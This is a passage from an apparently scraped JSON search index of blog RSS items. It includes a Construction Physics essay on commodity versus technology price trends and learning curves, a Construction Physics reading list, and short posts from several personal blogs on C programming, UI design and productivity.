production volume) at predicting future prices. And if we create our own version of the famous AEI chart, and look at the cost trends of different categories of manufactured goods in the Consumer Price Index, we find that they almost all get cheaper in inflation-adjusted terms over time.</p><p>But as we noted last week, it\u2019s also common for commodities to get cheaper over time. 24 of 25 different agricultural commodities we looked at got cheaper over their time series, and 60 of 93 different mineral commodities were. Even fossil fuels have historically exhibited long periods where they got cheaper over time \u2014 oil got cheaper for the hundred-year period from the 1860s to the 1960s.</p><p>The graph that the Rocky Mountain Institute uses to demonstrate that commodities don\u2019t get cheaper in fact shows the price of coal-generated electricity falling by roughly a factor of 10 over a period of 70 years. This is by way of the \u201ctechnology\u201d of larger and more efficient coal plants, but it obviously deflates the technologies vs. commodities argument if in practice fossil fuel power can get cheaper over time by way of technological improvements, even if the fuel inputs themselves don\u2019t.</p><p>However, historically manufactured goods do seem more likely to get cheaper over time. Below are graphs showing the average annual real price change for 124 different commodities, and for 67 different categories of manufactured goods in the Consumer Price Index, over 20 year windows of time. (So iron ore, which has price data from 1900 to 1921, is broken into price windows from 1900 to 1919, 1920 to 1939, etc. and an average rate of real price change is calculated for each window.) We can see that while both commodities and manufactured goods have a tendency to get cheaper over time (seen as a left skew on the graph), the tendency is greater for manufactured goods.</p><p>(Note that this isn\u2019t a 1 to 1 comparison. Most manufactured good inflation data is post-1980, while the commodity price data in general stretches back much farther.)</p><p>The difference is even more stark if we just look at the 20-year period from 2000 to 2020. Manufactured goods still have a tendency to get cheaper, but commodities no longer do.</p><p>So contra the \u201ctechnologies vs. commodities\u201d theory, both technologies and commodities can get cheaper over time, but technologies seem to have more consistent price declines, particularly recently.</p>Do commodities and technologies have different price dynamics?<p>I think it\u2019s true that there are, broadly, somewhat different dynamics at work when it comes to the prices of technologies vs. commodities. Commodities (as I noted last week, and as the Rocky Mountain Institute report argues) can be subject to depletion dynamics: getting used up in a particular location. And because they\u2019re often found in specific locations, it\u2019s perhaps easier to control the supply of commodities and use that control to manipulate the price. OPEC was famously able to effectively control the price of oil for many years, and De Beers was able to control almost the entire world\u2019s supply of diamonds for over a century to keep prices artificially high.</p><p>But I think there\u2019s also a significant amount of overlap in the price and production dynamics of technologies and commodities. Commodities mined from the earth are still a product of technology, of some particular process that gets used to extract, refine, and transport them. Like with manufacturing processes, this production process can be improved and made more efficient over time. The technology used to drill oil and natural gas wells has improved enormously over time thanks to the development of PDC drill bits and hydraulic fracking. These and other technical improvements have allowed oil producers to get more and more oil from fewer and fewer drilling rigs.</p><p>These productivity improvements haven\u2019t cashed out as drops in the price of oil, but for other commodities process improvements have resulted in price declines. Most widely-used metal commodities \u2014 steel, aluminum, titanium \u2014 saw dramatic price declines following technological process improvements. (The introduction of the Bessemer process, the Hall-Herroult process, and the Kroll process respectively.)</p><p>Conversely, the depletion dynamics and diseconomies of scale that commodities can be subjected to can also be at work with technologies. Wind power may be a \u201ctechnology\u201d in the sense that it\u2019s produced via repetitively manufactured wind turbines which need no consumable fuel, but a wind turbine needs to be installed somewhere where the wind is blowing, and there\u2019s only so many places where the wind blows enough for wind power to be practical. Models of available wind resources in the US, for instance, show increasing cost of wind-generated electricity as deployment rises because the best, windiest sites get occupied first, and because wake effects from a wind farm can reduce the energy generated from adjacent wind farms. Actual deployment of wind turbines appears to be more complex than simply \u201cthe windiest sites get occupied first\u201d, but reduced energy generation from wake effects is already an issue, and is projected to become more serious:</p><p>\u201cWe have seen wake effects for years, and knew they happen,\u201d says Ouro. \u201cThe problem is that in order to achieve net zero, we need to deploy a given amount of offshore wind capacity. So for 2030, we need to have three times more capacity than we have now, which means that in less than five years, we need to deploy thousands more turbines,\u201d he explains.</p><p>\u201c[Some of] these turbines are going to be operating very close to those that are already operating, so things are getting more and more crowded. So these wake effects are now starting to have more impact,\u201d he says.</p><p>Another important diseconomy of scale for wind and solar specifically is that as they get more widely deployed, they often become less popular. We see this dynamic with data centers, which used to be strongly favored by local communities (since they paid tax dollars but didn\u2019t place much additional burden on local services) but now increasingly face opposition. And we\u2019re seeing it with wind and solar, which are getting increasingly opposed by local residents. A 2023 report from Columbia notes that \u201clocal opposition to renewable energy facilities is widespread and growing, and represents a potentially significant impediment to achievement of climate goals.\u201d A blog post from think tank R Street on wind energy permitting restrictions similarly notes that:</p><p>\u2026when we compare new ordinances to wind power generation in the United States, we see a matching trend, indicating that wind ordinances are likely a response to the increasing likelihood of living near permitted wind power. This would be consistent with findings that counties with or near wind power are also most likely to adopt restrictions on the development of wind power.</p><p>It\u2019s possible to overcome or offset some of these dynamics technologically. Lower wind speeds, for instance, can be dealt with by using larger, taller wind turbines (up to the point where such turbines become infeasible to build on land due to transportation difficulties). Solar PV labor costs can be overcome by better automation for panel installation. But of course, it\u2019s also possible to offset depletion dynamics technologically for commodities as well. Fracking is an obvious example, a technological development that made it possible to extract oil and natural gas from locations where it was previously infeasible or impractical to do so. Thanks to fracking, proven reserves of oil and natural gas in the US have actually increased since the year 2000.</p><p>Technologies can also be controlled by cartels, though my impression is that technology cartels are generally less successful than ones which try to control natural resources. The Phoebus light bulb cartel, which coordinated to artificially limit the lifespan of incandescent bulbs, only lasted for 14 years.</p><p>So in aggregate, there are probably somewhat different dynamics between commodities and technologies, but the boundaries between these categories are fairly fuzzy, and have a great deal of overlap. Commodity prices can decline over time thanks to technology improvements and economies of scale, and technologies can be affected by depletion dynamics and other diseconomies.</p>Do commodities have learning curves?<p>Determining if commodities have learning curves \u2014 that is, if they fall in price as a function of cumulative production volume \u2014 turns out to be a complicated question. If you just graph price vs. production volume data for various commodities, very few seem like they\u2019re following any sort of learning curve, showing nice straight or mostly-straight lines going down and to the right on a log-log plot. The USGS mineral commodity datasets, include worldwide production volume for various mineral commodities going back to 1900. Some of these look like they\u2019re following a learning curve, but most don\u2019t.</p><p>Similarly, USDA crop datasets include annual quantities harvested, which we can use to construct a learning curve. These look a little more like learning curves (they\u2019re generally headed down and to the right), but they\u2019re certainly not nice straight lines.</p><p>However, a major problem with these charts is that we\u2019re not actually graphing price against cumulative production volume. Instead, we\u2019re graphing price against production volume starting at some particular point in time. USGS mineral commodity data goes back to 1900, but most of those commodities were being produced long before 1900. Some minerals, like gypsum, copper, iron, and lime, have been mined for thousands of years.</p><p>Agricultural commodities have the same problem \u2014 crops were being harvested in the US long before the USDA datasets began. The learning curves above are thus missing a large amount of production that occurred prior to the beginning of the dataset.</p><p>If some amount of early production is missing from your learning curve dataset, this will distort the linear relationship between price and cumulative production on a log-log chart. Say you\u2019ve produced 1000 units of something total. If you\u2019re following a normal learning curve, you shouldn\u2019t expect costs to fall very much over the next 20 units: going from 1000 to 1020 is only a small fraction of a doubling, and learning curves will (theoretically) have a constant percentage decrease in cost for every doubling of cumulative production volume. Thus a very small decline in price is expected. But what if production data is missing, and you think you\u2019ve only produced 10 units instead of 1000. Now the next 20 units is a much larger fraction of production: you think you\u2019re going from 10 to 30, more than tripling cumulative production. Now a very small decline in price looks like a very flat learning curve.</p><p>The graphs below show several learning curves. The first is the \u201ctrue\u201d learning curve with all the production data intact. The other graphs have various amounts of early production data missing, causing the graph to incorrectly start at an earlier point. The more production is omitted, the more the learning curve flattens out and deviates from the true curve. And it doesn\u2019t take much omitted data to really distort the curves, so even the fact that most commodity use is fairly recent doesn\u2019t rescue us from this problem.</p><p>(Thanks to Matt Clancy for pointing this out.)</p><p>Because many commodities have been mined or harvested for centuries or millennia, it\u2019s hard to get an accurate sense of what cumulative production volume truly is. This makes commodities different from technologies or manufactured goods, where it\u2019s much easier to determine both when production started and what cumulative production is. Without good estimates of actual cumulative production volume, it\u2019s hard to tell whether commodities follow learning curves or not.</p><p>Interestingly, for a few commodities where we can be confident we\u2019re not missing much (if any) production volume, we often get something much more learning curve-like. Titanium metal, which basically didn\u2019t exist prior to the 20th century, follows a nice learning curve. Aluminum was only produced in tiny amounts prior to the invention of the Hall-Herroult process, and also follows a nice learning curve.</p><p>This isn\u2019t universally true. The USGS helium dataset probably covers almost all cumulative production (since helium wasn\u2019t isolated until 1895), but its price history doesn\u2019t appear especially learning curve-like, possibly due to government price controls or because it\u2019s almost entirely a byproduct of natural gas extraction. But it nevertheless seems notable.</p>Conclusion<p>Overall I think the \u201ctechnologies vs. commodities\u201d theory gets at a real, meaningful distinction. Manufactured goods do seem more likely to decline in price over time than extracted commodities, and are probably broadly subject to somewhat different price dynamics. It\u2019s also pretty unclear if commodities generally follow learning curves the way that manufactured goods do.</p><p>But this distinction is blurry, and in practice there\u2019s a lot of overlap between the two categories. Both commodities and technologies can have falling prices thanks to efficiency-enhancing production improvements, and both can be subject to depletion effects or other diseconomies of scale. And at the limit, the price of some technology should approach the price of its raw material inputs, making it in effect a bundle of commodities. For energy technologies (the only place I\u2019ve seen the \u201ctechnology vs. commodity\u201d distinction get made), there are also plenty of cases where the distinction breaks down. Hydropower isn\u2019t commodity-based (in the sense that it doesn\u2019t burn any fuel), but it also isn\u2019t the product of modular, repetitively manufactured goods like wind and solar are. And it\u2019s subject to severe depletion dynamics, since there\u2019s only so many places you can build a hydroelectric dam.</p><p>(I also find the \u201ctechnologies vs. commodities\u201d concept sort of philosophically irritating, as every aspect of civilization, from manufactured goods to commodities like steel, oil, and corn, is a product of technology.)</p><p>So while I don\u2019t think the distinction between technologies and commodities is meaningless, I also don\u2019t think it does a particularly good job of carving reality at the joints. I think folks would be better served talking about the specific dynamics at work, and the specific problems that need to be solved, rather than thinking in terms of what, in practice, is a pretty fuzzy abstraction.</p><p>Thanks to Matt Clancy and Austin Vernon for reading a draft of this. All errors are my own.</p>'}</p> <p>\u6293\u53d6\u65f6\u95f4: 2026-02-05 08:41:00</p>"},{"location":"construction-physics.com/Reading%20List%20for%2001-31-2026_20260131/","title":"Reading List for 01/31/2026","text":"<p>\u6765\u6e90: construction-physics.com \u53d1\u5e03\u65f6\u95f4: Sat, 31 Jan 2026 13:02:52 GMT \u94fe\u63a5: https://www.construction-physics.com/p/reading-list-for-01312026</p> <p>{'type': 'text/html', 'language': None, 'base': 'https://www.construction-physics.com/feed', 'value': 'Vertical boring machine, via Industrial History.<p>Welcome to the Reading List, a weekly roundup of news and links related to buildings, infrastructure, and industrial technology.</p><p>Some housekeeping items:</p><ul><li><p>Continuing with the new reading list format this week, this time with a paywall ~1/3rd of the way down. I got some feedback that folks liked a little more analysis, so I\u2019ve expanded that a bit more. As a reminder, this is intended to be a little bit more comprehensive than the older format, a more general survey of what went on in the world of infrastructure, buildings, and building things last week.</p></li><li><p>Last week I included a link to a claim on Twitter that Washington state lawmakers introduced a law that would inadvertently ban manufacturing. Several folks pointed out that this was incorrect.</p></li></ul>Housing<p>Friend of the newsletter Bobby Fijan announced his new homebuilding company. The American Housing Company is a new, vertically integrated housing startup that plans to design, build, and sell or rent modular homes aimed specifically at families. There\u2019s a few interesting things about their approach: they\u2019re acting as both the builder and the developer, instead of trying to sell their homes to existing developers. And they\u2019re using Structural Insulated Panels (SIPs), something I\u2019ve always thought of as an underrated building technology. [American Housing]</p><p>The Telegraph has an article that drills into some of the code restrictions that prevent the construction of classic, beautiful architecture in Britain. [Telegraph]</p><p>Trump: \u201cI don\u2019t want to drive housing prices down. I want to drive housing prices up for people who own homes.\u201d [Twitter]</p><p>The Terner Center\u2019s Housing Ventures Lab is accepting applications for its accelerator program for new housing ventures. [Terner Labs]</p>Manufacturing<p>One of the most potent criticisms of tariffs is that they actually harm manufacturing by raising the costs of manufacturing inputs. In that vein, aluminum in the US used to be roughly the same price as in Europe and Japan, but starting in 2025 it diverged. \u201cThe regional premium for aluminum delivered to the US market climbed above $1 a pound for the first time as US President Donald Trump\u2019s tariffs make the metal more expensive in the domestic market.\u201d [Bloomberg]</p><p>Tesla seems eager to get out of the EV business, which is in the process of being totally eaten by Chinese manufacturers. This week Tesla announced that it will stop producing the Model S and Model X. The California factory where they\u2019re built will be repurposed to build the Optimus humanoid robot. [BBC]</p><p>In that vein, China is now responsible for 2/3rds of all worldwide EV sales. [Twitter] And 20% of all heavy trucks sold in China are now EVs. [Bloomberg]</p>\\n      <p>\\n          \\n              Read more\\n          \\n      </p>'}</p> <p>\u6293\u53d6\u65f6\u95f4: 2026-02-05 08:41:00</p>"},{"location":"danielchasehooper.com/","title":"danielchasehooper.com\\n\\n\u7f51\u7ad9: https://danielchasehooper.com\\nRSS: https://danielchasehooper.com/feed.xml\\n\\n---\\n\\n## \u6700\u65b0\u6587\u7ae0\\n\\n- Testing Opus 4.5 For C Programming_20260205\\n- Hot reloading is better than SwiftUI previews_20260205\\n- I Made A Real-Time Build Visualizer_20260205\\n- A Fast, Growable Array With Stable Pointers in C_20260205\\n- Type Safe Generic Data Structures in C_20260205\\n","text":""},{"location":"danielchasehooper.com/A%20Fast%2C%20Growable%20Array%20With%20Stable%20Pointers%20in%20C_20260205/","title":"A Fast, Growable Array With Stable Pointers in C\\n\\n\u6765\u6e90: https://danielchasehooper.com\\n\u94fe\u63a5: https://danielchasehooper.com/posts/segment_array/\\n\u65e5\u671f: Tue, 05 Aug 2025 00:00:00 +0000\\n\\n---\\n\\nMy last article about generic data structures in C was written to set the stage for today\u2019s topic: A data structure with constant time indexing, stable pointers, and works well with arena allocators. Its been independently discovered by multiple programmers over the years and so goes by different names. A 2001 paper called it a \u201clevelwise-allocated pile\u201d (bleh). Zig calls it a \u201cSegmented List\u201d. Then there\u2019s C++ with std::deque, which is only superficially similar.\\nRead the whole article on\\ndanielchasehooper.com \u2192","text":""},{"location":"danielchasehooper.com/Hot%20reloading%20is%20better%20than%20SwiftUI%20previews_20260205/","title":"Hot reloading is better than SwiftUI previews\\n\\n\u6765\u6e90: https://danielchasehooper.com\\n\u94fe\u63a5: https://danielchasehooper.com/posts/hot-reloading-swiftui/\\n\u65e5\u671f: Mon, 13 Oct 2025 00:00:00 +0000\\n\\n---\\n\\nDid you know you can change the code of a SwiftUI app while it\u2019s running? And that you can do it without using Xcode? The technique is called \u2018hot reloading\u2019 and I\u2019ll show you how to do it by making a Todo app\\nRead the whole article on\\ndanielchasehooper.com \u2192","text":""},{"location":"danielchasehooper.com/I%20Made%20A%20Real-Time%20Build%20Visualizer_20260205/","title":"I Made A Real-Time Build Visualizer\\n\\n\u6765\u6e90: https://danielchasehooper.com\\n\u94fe\u63a5: https://danielchasehooper.com/posts/syscall-build-snooping/\\n\u65e5\u671f: Wed, 13 Aug 2025 00:00:00 +0000\\n\\n---\\n\\nSometimes software takes a long time to compile just due to how much code it has, like in the LLVM project. But often a build is slower than it could be for dumb, fixable reasons. I\u2019ve had the suspicion that most builds are doing dumb stuff, but I had no way to see it. So I\u2019ve been working on a cross-platform tool to help visualize builds, and you can try it!\\nRead the whole article on\\ndanielchasehooper.com \u2192","text":""},{"location":"danielchasehooper.com/Testing%20Opus%204.5%20For%20C%20Programming_20260205/","title":"Testing Opus 4.5 For C Programming\\n\\n\u6765\u6e90: https://danielchasehooper.com\\n\u94fe\u63a5: https://danielchasehooper.com/posts/code-agents/\\n\u65e5\u671f: Wed, 07 Jan 2026 00:00:00 +0000\\n\\n---\\n\\nA grumpy C programmer sees what all the fuss is about\\nRead the whole article on\\ndanielchasehooper.com \u2192","text":""},{"location":"danielchasehooper.com/Type%20Safe%20Generic%20Data%20Structures%20in%20C_20260205/","title":"Type Safe Generic Data Structures in C\\n\\n\u6765\u6e90: https://danielchasehooper.com\\n\u94fe\u63a5: https://danielchasehooper.com/posts/typechecked-generic-c-data-structures/\\n\u65e5\u671f: Wed, 25 Jun 2025 00:00:00 +0000\\n\\n---\\n\\nSee my follow-up article: \u201cA Fast, Growable Array With Stable Pointers in C\u201d","text":"<p>I write type safe generic data structures in C using a technique that I haven\u2019t seen elsewhere1. It uses unions to associate type information with a generic data structure, but we\u2019ll get to that. My approach works for any type of data structure: maps, arrays, binary trees\u2026 but for this article I illustrate the ideas by implementing a basic linked list.\\nRead the whole article on\\ndanielchasehooper.com \u2192</p>"},{"location":"danieldelaney.net/","title":"danieldelaney.net\\n\\n\u7f51\u7ad9: https://danieldelaney.net\\nRSS: https://danieldelaney.net/feed\\n\\n---\\n\\n## \u6700\u65b0\u6587\u7ae0\\n\\n- I built a timer I can\u2019t fail to set_20260205\\n- Free software scares normal people_20260205\\n- Objectivity is superstition_20260205\\n- Chat is a bad UI pattern for development tools_20260205\\n- Data Center Monitoring_20260205\\n","text":""},{"location":"danieldelaney.net/Chat%20is%20a%20bad%20UI%20pattern%20for%20development%20tools_20260205/","title":"Chat is a bad UI pattern for development tools\\n\\n\u6765\u6e90: https://danieldelaney.net\\n\u94fe\u63a5: http://danieldelaney.net/chat/\\n\u65e5\u671f: Mon, 03 Feb 2025 00:00:00 +0000\\n\\n---\\n\\nCode forces humans to be precise. That\u2019s good. Computers need precision. But it also forces humans to think like machines.\\nFor decades we tried to fix this by making programming more human-friendly. Higher-level languages. Visual interfaces. Each step helped, but we were still translating human thoughts into computer instructions.\\nAI was supposed to change everything. Finally, plain English could be a programming language. No syntax. No rules. Just say what you want.\\nThe first wave of AI coding tools squandered this opportunity. They make flashy demos but produce garbage software. People call them \u201cgreat for prototyping,\u201d which means \u201cdon\u2019t use this for anything real.\u201d\\nMany blame the AI models, saying we just need them to get smarter. This is wrong. Yes, better AI will make better guesses about what you mean. But when you\u2019re building serious software, you don\u2019t want guesses. Not even smart ones. You want to know exactly what you\u2019re building.\\nCurrent AI tools pretend writing software is like having a conversation. It\u2019s not. It\u2019s like writing laws. You\u2019re using English, but you\u2019re defining terms, establishing rules, and managing complex interactions between everything you\u2019ve said.\\nTry writing a tax code in chat messages. You can\u2019t. Even simple tax codes are too complex to keep in your head. That\u2019s why we use documents\u2014they let us organize complexity, reference specific points, and track changes systematically. Chat reduces you to memory and hope.\\nThis is the core problem. You can\u2019t build real software without being precise about what you want. Every successful programming tool in history reflects this truth. AI briefly fooled us into thinking we could just chat our way to complex software. We can\u2019t. You don\u2019t program by chatting. You program by writing documents.\\nWhen your intent is in a document instead of scattered across a chat log, English becomes a real programming language:\\nYou can see your whole system at once\\nYou can clarify and improve your intent\\nYou can track changes properly\\nTeams can work on the system together\\nRequirements become their own quality checks\\nChanges start from clear specifications\\nThe first company to get this will own the next phase of AI development tools. They\u2019ll build tools for real software instead of toys. They\u2019ll make everything available today look like primitive experiments.","text":""},{"location":"danieldelaney.net/Data%20Center%20Monitoring_20260205/","title":"Data Center Monitoring\\n\\n\u6765\u6e90: https://danieldelaney.net\\n\u94fe\u63a5: http://danieldelaney.net/rf/\\n\u65e5\u671f: Thu, 25 Jul 2019 00:00:00 +0000\\n\\n---\\n\\nThe Challenge\\nThe computing power that runs the world is hidden away in data centers that few people get to see. While many data centers are lights-out operations most of the time, people are still needed to update them, keep them running, and prevent and resolve outages. Those people need to know where their critical assets are in the labyrinth that is their global data center network. They need to know when areas get too hot, or get so cold and humid that condensation becomes a worry.\\nIn addition to data centers, large enterprises will also have smaller compute sites scattered across the nation or the world. Those sites are often physically unmanned with poor visibility into the health of critical systems. Operators need to know when potential issues arise and how to prioritize them.\\nI helped solve both of those problems by operating as a product designer and product manager.\\nResearch\\nAt the start of a new initiative, I want to understand how it\u2019s meant to help the business, who the buyer is and what their behavior is like, and whether we can feasibly produce a solution which is both valuable and usable.\\nI also want to understand the context of the challenge as best I can. I put together extensive design research presentations with photos and video inside of real, working data centers. These included profiles of specific data center operators, personas/archetypes extracted from them, and detailed notes on pain points that customers face.\\nSketching\\nOnce the context and specific challenges are understood, it\u2019s time to start rapidly sketching and prototyping solutions. I like to use sketches to validate ideas quickly, without a lot of investment in the wrong direction.\\nSpecifications\\nOnce I\u2019ve put ideas in front of customers and gotten enough feedback to be confident in a direction, I produce specs for engineers to build the real thing. While sketches can convey functionality, if new elements are used for which I don\u2019t already have a visual design specification, it\u2019s important to provide fully realized mockups. This frequently involves extensive annotation, a set of mockups of design prototype, and/or finished HTML/CSS.\\nSorry, this video didn't work.\\nDesign system/asset library\\nIn many cases the sketch is sufficient because the visual design of reusable elements has already been defined as part of a component library or as part of the product design guidelines. Either way, having as much common material in one place as possible saves a lot of time.\\nSorry, this video didn\u2019t work.\\nEmbedding with software\\nOnce the appropriate specifications are produced, I work extensively with software engineers. I write stories in JIRA, collaborate to find clever solutions to performance problems on Slack, attend daily standups, and even contribute CSS here and there. Whatever I can do to ensure that the finished product is as good as our intentions.\\nBeing the everything-er\\nGetting a product off the ground is bigger than any one specialization. As needed, I\u2019ll produce user guides, hardware UX input, marketing materials, you name it.","text":""},{"location":"danieldelaney.net/Free%20software%20scares%20normal%20people_20260205/","title":"Free software scares normal people\\n\\n\u6765\u6e90: https://danieldelaney.net\\n\u94fe\u63a5: http://danieldelaney.net/normal/\\n\u65e5\u671f: Thu, 30 Oct 2025 00:00:00 +0000\\n\\n---\\n\\nI\u2019m the person my friends and family come to for computer-related help. (Maybe you, gentle reader, can relate.) This experience has taught me which computing tasks are frustrating for normal people.\\nNormal people often struggle with converting video. They will need to watch, upload, or otherwise do stuff with a video, but the format will be weird. (Weird, broadly defined, is anything that won\u2019t play in QuickTime or upload to Facebook.)\\nI would love to recommend Handbrake to them, but the user interface is by and for power users. Opening it makes normal people feel unpleasant feelings.\\nThis problem is rampant in free software. The FOSS world is full of powerful tools that only have a \u201cpower user\u201d UI. As a result, people give up. Or worse: they ask people like you and I to do it for them.\\nI want to make the case to you that you can (and should) solve this kind of problem in a single evening.\\nTake the example of\\nMagicbrake\\n, a simple front end I built. It hides the power and flexibility of Handbrake. It does only\\nthe one thing\\nmost people need Handbrake for: taking a weird video file and making it normal. (Normal, for our purposes, means a small MP4 that works just about anywhere.)\\nThere is exactly one button.\\nThis is a fast and uncomplicated thing to do. Unfortunately, the people who have the ability to solve problems like this are often disinclined to do it.\\n\u201cWhy would you make Handbrake less powerful on purpose?\u201d\\n\u201cWhat if someone wants a different format?\u201d\\n\u201cWhat about [feature/edge case]?\u201d\\nThe answer to all these questions is the same: a person who needs or wants that stuff can use Handbrake. If they don\u2019t need everything Handbrake can do and find it bewildering, they can use this. Everyone wins.\\nIt\u2019s a bit like obscuring the less-used functions on a TV remote with tape. The functions still exist if you need them, but you\u2019re not required to contend with them just to turn the TV on.\\nPeople benefit from stuff like this, and I challenge you to make more of it. Opportunities are everywhere. The world is full of media servers normal people can\u2019t set up. Free audio editing software that requires hours of learning to be useful for simple tasks. Network monitoring tools that seem designed to ward off the uninitiated. Great stuff normal people don\u2019t use. All because there\u2019s only one UI, and it\u2019s designed to do\\neverything.\\n80% of the people only need 20% of the features. Hide the rest from them and you\u2019ll make them more productive and happy. That\u2019s really all it takes.","text":""},{"location":"danieldelaney.net/I%20built%20a%20timer%20I%20can%E2%80%99t%20fail%20to%20set_20260205/","title":"I built a timer I can\u2019t fail to set\\n\\n\u6765\u6e90: https://danieldelaney.net\\n\u94fe\u63a5: http://danieldelaney.net/timer/\\n\u65e5\u671f: Tue, 02 Dec 2025 00:00:00 +0000\\n\\n---\\n\\nHave you ever gotten to the end of a long work day and realized you\u2019re no closer to your goals? I have.\\nSure, I was doing a lot of\\nstuff.\\nBut I wasn\u2019t pausing to ask whether I was doing the\\nright\\nstuff. Or whether my approach was working. Or if I was spending the right amount of time on it. My fingers were moving but I wasn\u2019t really thinking.\\nSo I needed a reliable way to interrupt my \u201cunproductive productivity\u201d and actually think. The obvious solution was a timer.\\nUnfortunately, if you use timers a lot, you learn to dismiss them reflexively. And it\u2019s really easy to forget to set the next timer. A week later, I\u2019d realize: \u201cHey, that timer idea really worked, I should get back to that.\u201d And then I didn\u2019t.\\nSo I built a new kind of timer. It does 2 unique things:\\nIt asks what I\u2019ll focus on.\\nIt gradually blurs my screen if I don\u2019t set a new timer.\\nWhen it asks \u201cWhat will you focus on?\u201d I answer in a word or two, start the next timer, and keep working. Having to name my intention keeps me fully aware of my trajectory. If I\u2019m in danger of drifting, it\u2019s obvious. And if I avoid thinking for long enough, my screen starts getting harder to see.\\nIf I\u2019m making great progress on something that doesn\u2019t require much thinking, I can set the timer for a longer duration, maybe 30 minutes. But if I\u2019m working on something more open-ended, I might tighten the leash all the way down to 3 minutes. Then I can\u2019t get off track.\\nUnlike a regular timer,\\nI can\u2019t fail to set the next one.\\nIf I don\u2019t answer it promptly, the screen gradually becomes less readable until I do. If I wanted to avoid answering, I\u2019d have to make a conscious decision to close the app. I\u2019d have to decide to be less productive. I never do.\\nThis small intervention has worked beautifully. Not only am I catching unproductive divergences earlier, I\u2019m noticing fewer of them over time. It seems to be training me to do more and better thinking.\\nIt\u2019s not a replacement for a journal. I love journaling, but that takes more than a few seconds, and there\u2019s a lot of benefit to reflecting more frequently.\\nIf you\u2019re running macOS,\\nIntention is available here\\n. I use it every day, and I think it\u2019s the superior way of working.","text":""},{"location":"danieldelaney.net/Objectivity%20is%20superstition_20260205/","title":"Objectivity is superstition\\n\\n\u6765\u6e90: https://danieldelaney.net\\n\u94fe\u63a5: http://danieldelaney.net/objectivity/\\n\u65e5\u671f: Mon, 17 Mar 2025 00:00:00 +0000\\n\\n---\\n\\nAn objective, external world is a non-falsifiable assumption.\\nThe prevailing theory is that our subjective experiences correspond to an external reality. However, they may simply be subjective through and through.\\nThat which we claim to be evidence of external reality is actually subjective experience, which may or may not have an external and objective cause.\\nAny test devised to prove objectivity is evaluated within subjectivity and therefore does not require objectivity to explain the result.\\nSome object to this, claiming that the consistency of experience is best explained by an external world. However, consistent experience does not require any external mechanism, let alone the specific one we have assumed.\\nClaiming that belief in an external world is simpler is like claiming that belief in God is simpler; in truth we are inventing something vast and complex without evidence and agreeing not to question it. This is not science, it is a substitute for epistemic humility.\\nMuch as dreams appear consistent while dreaming, that which we consider waking experience may not actually be as consistent as we believe. However, questioning this is unproductive reasoning because it undermines the value of reason itself. We must assume our experiences are rational and consistent, or else give up thinking altogether.\\nExperience is the only reality which is detectable.\\nWhatever experience is, it is real and directly perceptible, unlike objectivity.\\nClaims that experience is an illusion presuppose an objective world to which experience does not correspond.\\nPragmatic truth is supportable, correspondence is not. If an objective world can\u2019t be proven, neither can we prove that knowledge does or does not correspond with it.\\nThat which produces a consistent effect in experience is useful in influencing experience in the desired way, therefore science is useful.\\nMaterialism is religious faith.\\nJust as we once invented a spirit world to help explain our experiences, we invented an objective world for which there is similar quality evidence. Both are assumed to explain experience, yet neither is directly known.\\nThe assertion that matter gives rise to experience is no more compelling than the assertion that experience gives rise to matter.\\nThe assumption of an external world has zero explanatory power, as consistent experience does not require it.\\nMaterialism is superior to classical religions in that it responds to pragmatic truth, but it still accepts unsupportable metaphysical claims and regards them as unquestionable.\\nBy contrast, noting that we have experiences does not require extrapolation or invention.\\nModern civilization is optimizing materials, not experiences.\\nFocus on economic metrics has allowed us to make tremendous progress in reducing starvation and otherwise improve the experience of the least fortunate. Nonetheless, the subtle error of conflating material improvement with improvement in well-being has consequences.\\nIn advanced societies, increases in abstract indicators of material wealth like GDP have been accompanied by negative changes in consciousness: stress, social disconnection, and increased suicide.\\nThe materialist assumption that improving external conditions will always trickle down to better experiences is demonstrably unreliable. Often, this assumption results in methods which improve economic indicators\\nby reducing experiential well-being,\\nand in these cases it is worse than nothing.\\nIn addition to misallocating its priorities, modern civilization also conditions people to feel powerless over their own well-being. As materialist structures (corporations, governments, economic systems) become more dominant, individuals are increasingly absorbed into mechanisms designed to optimize external conditions rather than subjective experience. People come to believe that their quality of life is dictated by forces beyond their control.\\nThe best way to improve experience is to optimize it directly.\\nThe only rational goal is maximizing satisfaction.\\nLong-term positive changes in consciousness are what is best in life.\\nIf a person achieves material or hedonistic aims but is unsatisfied in the long term, they are having a negative experience and are working against themselves.\\nSecure, nourish, nurture, and build yourself and your community. Seek what is satisfying and aesthetic\u2014that which feels good and true and beautiful. Unlike materialist assumptions, this requires no external faith, only a direct commitment to improving the reality we actually experience.","text":""},{"location":"danielwirtz.com/","title":"danielwirtz.com\\n\\n\u7f51\u7ad9: https://danielwirtz.com\\nRSS: https://danielwirtz.com/rss.xml\\n\\n---\\n\\n## \u6700\u65b0\u6587\u7ae0\\n\\n- How to create a tool library in Airtable_20260205\\n- Using Roam Highlighter with Logseq_20260205\\n- Tracking LinkedIn profile analytics with Airtable_20260205\\n- Pulling the plug on Roamflow_20260205\\n- Task Management in Roam Research_20260205\\n","text":""},{"location":"danielwirtz.com/How%20to%20create%20a%20tool%20library%20in%20Airtable_20260205/","title":"How to create a tool library in Airtable\\n\\n\u6765\u6e90: https://danielwirtz.com\\n\u94fe\u63a5: https://danielwirtz.com/blog/airtable-tool-library\\n\u65e5\u671f: Thu, 09 Dec 2021 19:35:00 GMT\\n\\n---\\n\\nundefined","text":""},{"location":"danielwirtz.com/Pulling%20the%20plug%20on%20Roamflow_20260205/","title":"Pulling the plug on Roamflow\\n\\n\u6765\u6e90: https://danielwirtz.com\\n\u94fe\u63a5: https://danielwirtz.com/blog/roamflow\\n\u65e5\u671f: Mon, 26 Jul 2021 19:10:00 GMT\\n\\n---\\n\\nWhy I'm stopping my work on Roamflow","text":""},{"location":"danielwirtz.com/Task%20Management%20in%20Roam%20Research_20260205/","title":"Task Management in Roam Research\\n\\n\u6765\u6e90: https://danielwirtz.com\\n\u94fe\u63a5: https://danielwirtz.com/blog/roam-research-task-management\\n\u65e5\u671f: Tue, 26 Jan 2021 22:00:00 GMT\\n\\n---\\n\\nA walkthrough of my task management system","text":""},{"location":"danielwirtz.com/Tracking%20LinkedIn%20profile%20analytics%20with%20Airtable_20260205/","title":"Tracking LinkedIn profile analytics with Airtable\\n\\n\u6765\u6e90: https://danielwirtz.com\\n\u94fe\u63a5: https://danielwirtz.com/blog/linkedin-profile-analytics\\n\u65e5\u671f: Fri, 17 Sep 2021 12:08:00 GMT\\n\\n---\\n\\nDIY way of tracking LinkedIn analytics","text":""},{"location":"danielwirtz.com/Using%20Roam%20Highlighter%20with%20Logseq_20260205/","title":"Using Roam 